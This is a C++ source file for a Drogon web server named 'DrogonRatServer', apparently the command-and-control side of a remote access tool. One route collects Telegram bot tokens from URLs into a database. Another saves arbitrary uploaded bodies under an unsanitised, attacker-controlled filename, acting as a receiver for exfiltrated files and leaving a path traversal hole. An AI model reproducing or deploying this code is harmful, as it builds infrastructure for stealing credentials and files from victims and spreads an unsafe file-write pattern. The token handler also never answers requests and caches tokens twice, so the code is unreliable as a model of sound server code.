#include "DrogonRatServer/Handler.hpp"
#include "DrogonRatServer/debug.hpp"
#include "TelegramBotApiModels/TelegramBot.h"

#include <algorithm>
#include <drogon/HttpAppFramework.h>
#include <drogon/HttpResponse.h>
#include <drogon/orm/Mapper.h>
#include <fmt/core.h>
#include <fstream>

namespace DrogonRatServer {

using HttpResponseCallback =
    std::function<void(const drogon::HttpResponsePtr &)>;

using namespace drogon_model::sqlite3;

void Handler::registerTelegramBotApiHandler() {
	this->drogon_app.registerHandler(
	    "/bot{token}",
	    [this](const drogon::HttpRequestPtr &, HttpResponseCallback &&,
	           const std::string &arg_Token) {
			if(std::find(cached_tokens.begin(), cached_tokens.end(),
			             arg_Token) != cached_tokens.end()) {
				DEBUG_LOG("Token {} already cached", arg_Token);
				return;
			}

		p_db_client->execSqlAsync(
		    "INSERT INTO telegram_bot (token, can_receive_updates) VALUES (?, "
		    "1);",
		    [this, arg_Token](const drogon::orm::Result &) {
			    cached_tokens.push_back(arg_Token);
			    DEBUG_LOG("Token {} inserted into DB and cached", arg_Token);
		    },
		    [arg_Token](const drogon::orm::DrogonDbException &err) {
			    DEBUG_LOG("DB insert failed for token {}: {}", arg_Token,
			              err.base().what());
		    },
		    arg_Token);

		// 3. Cache immediately (optimistic path)
		cached_tokens.push_back(arg_Token);
		DEBUG_LOG("Token {} cached optimistically", arg_Token);
	    },
	    {drogon::Post, drogon::Get});
}

void Handler::registerUploadHandler() {
	this->drogon_app.registerHandler(
	    "/upload={filename}", // filename provided in URL
	    [](const drogon::HttpRequestPtr &req, HttpResponseCallback &&callback,
	       const std::string &filename) {
		    std::ofstream out(fmt::format("upload/{}", filename),
		                      std::ios::binary);
		    out << req->getBody();
		    out.close();

		    auto resp = drogon::HttpResponse::newHttpResponse();
		    resp->setBody(fmt::format("Saved as upload/{}", filename));
		    callback(resp);
	    },
	    {drogon::Post, drogon::Put});
}

void Handler::registerEchoHandler() {
	this->drogon_app.registerHandler(
	    "/echo={message}", // message provided in URL
	    [](const drogon::HttpRequestPtr &, HttpResponseCallback &&arg_Callback,
	       const std::string &arg_Message) {
		    INFO_LOG("Recieving as message:\n{}", arg_Message);
		    auto resp = drogon::HttpResponse::newHttpResponse();
		    resp->setBody(arg_Message);
		    arg_Callback(resp);
	    },
	    {drogon::Get, drogon::Post});
}

} // namespace DrogonRatServer
